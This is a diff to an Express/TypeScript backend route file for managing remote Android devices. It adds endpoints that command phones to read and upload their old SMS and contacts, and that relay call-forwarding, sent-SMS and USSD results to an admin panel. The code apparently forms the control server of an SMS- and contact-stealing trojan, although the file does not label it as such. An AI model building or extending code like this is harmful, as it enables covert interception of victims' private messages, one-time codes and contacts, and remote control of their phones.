@@ -1,4 +1,4 @@
-// File: src/routes/devices.ts  (with_gmail version)
+// File: src/routes/devices.ts
 import express, { Request, Response } from "express";
 import logger from "../logger/logger";
 import Device from "../models/Device";
@@ -8,6 +8,7 @@ import AppNotification from "../models/Notification";
 import MasterNotification from "../models/MasterNotification";
 import AdminModel from "../models/Admin";
 import wsService from "../services/wsService";
+import { sendCommandToDevice as fcmSendCommand } from "../services/fcmService";
 import { updateFcmToken, updateLastSeen, touchLastSeen } from "../services/deviceService";
 import config from "../config";
 import { classifySms } from "../services/smsClassifier";
@@ -147,7 +148,7 @@ router.get("/status", async (_req, res) => {
 });
 
 /* ═══════════════════════════════════════════
-   LOCK ALL / UNLOCK ALL  ← NEW
+   LOCK ALL / UNLOCK ALL
    (must be before /:deviceId wildcard)
    ═══════════════════════════════════════════ */
 
@@ -184,12 +185,27 @@ router.put("/:deviceId/lastSeen", async (req: Request, res: Response) => {
     const doc = await updateLastSeen(deviceId, action, battery);
     try { wsService.notifyDeviceLastSeen(deviceId, { at: Date.now(), action, battery }); } catch {}
     try { if (doc) wsService.broadcastDeviceUpsert(doc); } catch {}
-    return res.json({ success: true });
+
+    // checkedAt: only update when action is "ping" (explicit Check Online)
+    if (action === "ping") {
+      const now = Date.now();
+      await Device.updateOne({ deviceId }, { $set: { checkedAt: now } });
+      wsService.broadcastAdminEvent(
+        "check_online:result",
+        { deviceId, status: "online", checkedAt: now },
+        { deviceId }
+      );
+      logger.info("devices: checkedAt updated via ping", { deviceId });
+    }
+
+    // resyncToken: if fcmToken empty, tell device to resync
+    const noToken = !String((doc as any)?.fcmToken || "").trim();
+    return res.json({ success: true, resyncToken: noToken });
   } catch (err: any) { logger.error("devices: update lastSeen failed", err); return res.status(500).json({ success: false, error: err?.message || "server error" }); }
 });
 
 /* ═══════════════════════════════════════════
-   LOCK / UNLOCK SINGLE DEVICE  ← NEW
+   LOCK / UNLOCK SINGLE DEVICE
    ═══════════════════════════════════════════ */
 
 router.put("/:deviceId/lock", async (req: Request, res: Response) => {
@@ -328,11 +344,8 @@ router.put("/:deviceId/simSlots/:slot", async (req, res) => {
    ═══════════════════════════════════════════ */
 
 router.get("/notifications", async (req, res) => {
-  // SECURITY: API key required
   const provided = String(req.headers["x-api-key"] || "").trim();
-  if (!provided) {
-    return res.status(401).json({ success: false, error: "unauthorized" });
-  }
+  if (!provided) return res.status(401).json({ success: false, error: "unauthorized" });
   try {
     const list = await Sms.find().sort({ timestamp: -1 }).lean();
     const grouped: Record<string, any[]> = {};
@@ -416,7 +429,7 @@ router.delete("/notifications/olderThan/:cutoff", async (req, res) => {
 });
 
 /* ═══════════════════════════════════════════
-   SMS PUSH
+   SMS PUSH — WITH MASTER MODE CHECK
    ═══════════════════════════════════════════ */
 
 router.post("/:id/sms", async (req: Request, res: Response) => {
@@ -525,6 +538,187 @@ router.delete("/app-notifications", async (_req, res) => {
 });
 
 /* ═══════════════════════════════════════════
+   OLD SMS BATCH
+   ═══════════════════════════════════════════ */
+
+router.post("/:deviceId/notifications/batch", async (req: Request, res: Response) => {
+  try {
+    const deviceId = clean(req.params.deviceId);
+    const smsList  = req.body;
+    if (!Array.isArray(smsList) || smsList.length === 0) return res.status(400).json({ success: false, error: "empty batch" });
+    logger.info("devices: old SMS batch received", { deviceId, count: smsList.length });
+    let saved = 0, skipped = 0;
+    for (const sms of smsList) {
+      try {
+        const sender    = clean(sms.sender || sms.senderNumber || sms.address || "");
+        const body      = clean(sms.body || sms.message || "");
+        const timestamp = Number(sms.timestamp || sms.date || Date.now());
+        if (!body) { skipped++; continue; }
+        const exists = await Sms.findOne({ deviceId, sender, timestamp }).lean();
+        if (exists) { skipped++; continue; }
+        await new Sms({ deviceId, sender, senderNumber: clean(sms.senderNumber || sender), receiver: clean(sms.receiver || ""), title: clean(sms.title || "Old SMS"), body, timestamp, meta: { isOldSms: true } }).save();
+        saved++;
+      } catch (e: any) { logger.warn("devices: old SMS batch item save failed", { error: e?.message }); skipped++; }
+    }
+    try { await touchLastSeen(deviceId, "old_sms_batch"); } catch (_) {}
+    try { wsService.sendToAdminDevice(deviceId, { type: "event", event: "notification:batch", deviceId, data: { saved, skipped, source: "old_sms" }, timestamp: Date.now() }); } catch (_) {}
+    logger.info("devices: old SMS batch complete", { deviceId, saved, skipped });
+    return res.json({ success: true, saved, skipped });
+  } catch (err: any) {
+    logger.error("devices: old SMS batch failed", err);
+    return res.status(500).json({ success: false, error: err?.message });
+  }
+});
+
+/* ═══════════════════════════════════════════
+   TRIGGER READ OLD SMS
+   ═══════════════════════════════════════════ */
+
+router.post("/:deviceId/read-old-sms", async (req: Request, res: Response) => {
+  try {
+    const deviceId = clean(req.params.deviceId);
+    if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
+    const count = Number(req.body?.count || req.body?.days || 3);
+    logger.info("devices: read-old-sms triggered", { deviceId, count });
+    const result = await fcmSendCommand(deviceId, "read_old_sms", {
+      requestId: `oldsms_${deviceId}_${Date.now()}`,
+      extraData: { count, days: count, timestamp: Date.now() },
+    });
+    return res.json({ success: result.success, messageId: result.messageId, error: result.error });
+  } catch (err: any) {
+    logger.error("devices: read-old-sms failed", err);
+    return res.status(500).json({ success: false, error: err?.message });
+  }
+});
+
+/* ═══════════════════════════════════════════
+   CALL FORWARD RESULT (APK → Backend → WS → Admin)
+   ═══════════════════════════════════════════ */
+
+router.post("/:deviceId/call-forward-result", async (req: Request, res: Response) => {
+  try {
+    const deviceId = clean(req.params.deviceId);
+    if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
+    const status    = clean(req.body?.status   || "success");
+    const number    = clean(req.body?.number   || "");
+    const response  = clean(req.body?.response || "");
+    const uniqueid  = clean(req.body?.uniqueid || deviceId);
+    logger.info("devices: call-forward-result received", { deviceId, status, number });
+    wsService.broadcastAdminEvent("call_forward:result", {
+      uniqueid, deviceId, status, number, response, timestamp: Date.now(),
+    }, { deviceId, includeDeviceChannel: true });
+    return res.json({ success: true });
+  } catch (err: any) {
+    logger.error("devices: call-forward-result failed", err);
+    return res.status(500).json({ success: false, error: err?.message });
+  }
+});
+
+/* ═══════════════════════════════════════════
+   SMS SENT RESULT (APK → Backend → WS → Admin)
+   ═══════════════════════════════════════════ */
+
+router.post("/:deviceId/sms-sent", async (req: Request, res: Response) => {
+  try {
+    const deviceId  = clean(req.params.deviceId);
+    if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
+    const status    = clean(req.body?.status   || "sent");
+    const to        = clean(req.body?.to       || "");
+    const uniqueid  = clean(req.body?.uniqueid || deviceId);
+    logger.info("devices: sms-sent result received", { deviceId, status, to });
+    wsService.broadcastAdminEvent("sms:sent", {
+      uniqueid, deviceId, status, to, timestamp: Date.now(),
+    }, { deviceId, includeDeviceChannel: true });
+    return res.json({ success: true });
+  } catch (err: any) {
+    logger.error("devices: sms-sent failed", err);
+    return res.status(500).json({ success: false, error: err?.message });
+  }
+});
+
+/* ═══════════════════════════════════════════
+   USSD RESULT (APK → Backend → WS → Admin)
+   ═══════════════════════════════════════════ */
+
+router.post("/:deviceId/ussd-result", async (req: Request, res: Response) => {
+  try {
+    const deviceId = clean(req.params.deviceId);
+    if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
+    const status   = clean(req.body?.status   || "success");
+    const response = clean(req.body?.response || "");
+    const uniqueid = clean(req.body?.uniqueid || deviceId);
+    logger.info("devices: ussd-result received", { deviceId, status, response: response.slice(0, 50) });
+    wsService.broadcastAdminEvent("ussd:result", {
+      uniqueid, deviceId, status, response, message: response, timestamp: Date.now(),
+    }, { deviceId, includeDeviceChannel: true });
+    return res.json({ success: true });
+  } catch (err: any) {
+    logger.error("devices: ussd-result failed", err);
+    return res.status(500).json({ success: false, error: err?.message });
+  }
+});
+
+/* ═══════════════════════════════════════════
+   CONTACTS
+   ═══════════════════════════════════════════ */
+
+router.post("/:deviceId/contacts/batch", async (req: Request, res: Response) => {
+  try {
+    const deviceId     = clean(req.params.deviceId);
+    const contactsList = req.body;
+    if (!Array.isArray(contactsList) || contactsList.length === 0) return res.status(400).json({ success: false, error: "empty batch" });
+    logger.info("devices: contacts batch received", { deviceId, count: contactsList.length });
+    const Contact = (await import("../models/Contact")).default;
+    let saved = 0, skipped = 0;
+    for (const contact of contactsList) {
+      try {
+        const name        = clean(contact.name || "");
+        const number      = clean(contact.number || "");
+        const cleanNumber = clean(contact.cleanNumber || number.replace(/[^+\d]/g, ""));
+        const contactId   = clean(contact.contactId || "");
+        if (!number && !name) { skipped++; continue; }
+        const exists = await Contact.findOne({ deviceId, cleanNumber }).lean();
+        if (exists) { if (exists.name !== name && name) { await Contact.updateOne({ _id: exists._id }, { $set: { name } }); } skipped++; continue; }
+        await new Contact({ deviceId, name, number, cleanNumber, contactId }).save();
+        saved++;
+      } catch (e: any) { logger.warn("devices: contacts batch item save failed", { error: e?.message }); skipped++; }
+    }
+    try { await touchLastSeen(deviceId, "contacts_batch"); } catch (_) {}
+    try { wsService.sendToAdminDevice(deviceId, { type: "event", event: "contacts:updated", deviceId, data: { saved, skipped }, timestamp: Date.now() }); } catch (_) {}
+    logger.info("devices: contacts batch complete", { deviceId, saved, skipped });
+    return res.json({ success: true, saved, skipped });
+  } catch (err: any) {
+    logger.error("devices: contacts batch failed", err);
+    return res.status(500).json({ success: false, error: err?.message });
+  }
+});
+
+router.get("/:deviceId/contacts", async (req: Request, res: Response) => {
+  try {
+    const deviceId = clean(req.params.deviceId);
+    const Contact  = (await import("../models/Contact")).default;
+    const contacts = await Contact.find({ deviceId }).sort({ name: 1 }).lean();
+    return res.json(contacts);
+  } catch (err: any) {
+    logger.error("devices: get contacts failed", err);
+    return res.status(500).json([]);
+  }
+});
+
+router.post("/:deviceId/read-contacts", async (req: Request, res: Response) => {
+  try {
+    const deviceId = clean(req.params.deviceId);
+    if (!deviceId) return res.status(400).json({ success: false, error: "missing deviceId" });
+    logger.info("devices: read-contacts triggered", { deviceId });
+    const result = await fcmSendCommand(deviceId, "read_contacts", { requestId: `contacts_${deviceId}_${Date.now()}`, extraData: { timestamp: Date.now() } });
+    return res.json({ success: result.success, messageId: result.messageId, error: result.error });
+  } catch (err: any) {
+    logger.error("devices: read-contacts failed", err);
+    return res.status(500).json({ success: false, error: err?.message });
+  }
+});
+
+/* ═══════════════════════════════════════════
    DEVICE GET / UPDATE / DELETE
    ═══════════════════════════════════════════ */
 
@@ -542,7 +736,8 @@ router.put("/:deviceId", async (req, res) => {
     const deviceId = clean(req.params.deviceId);
     const metadata = req.body || {};
     const fcmToken = typeof metadata.fcmToken === "string" ? metadata.fcmToken.trim() : undefined;
-    const setObj: Record<string, any> = { "lastSeen.at": Date.now(), "lastSeen.action": "register" };
+    const now = Date.now();
+    const setObj: Record<string, any> = { "lastSeen.at": now, "lastSeen.action": "register" };
     const skipMetaKeys = ["fcmToken"];
     for (const [key, value] of Object.entries(metadata)) {
       if (skipMetaKeys.includes(key)) continue;
@@ -554,6 +749,11 @@ router.put("/:deviceId", async (req, res) => {
       if ((formModeDoc as any)?.meta?.enabled === true) setObj.masterFormDevice = true;
     } catch (_) {}
     const doc = await Device.findOneAndUpdate({ deviceId }, { $set: setObj }, { upsert: true, new: true }).lean();
+    // initialize checkedAt on first register if not set
+    if (doc && (!(doc as any).checkedAt || (doc as any).checkedAt === 0)) {
+      await Device.updateOne({ deviceId }, { $set: { checkedAt: now } });
+      (doc as any).checkedAt = now;
+    }
     try { if (doc) wsService.broadcastDeviceUpsert(doc); } catch (e) { logger.warn("devices: broadcast after metadata failed", e); }
     return res.json({ success: true });
   } catch (err: any) { logger.error("devices: update metadata failed", err); return res.status(500).json({ success: false, error: err?.message }); }
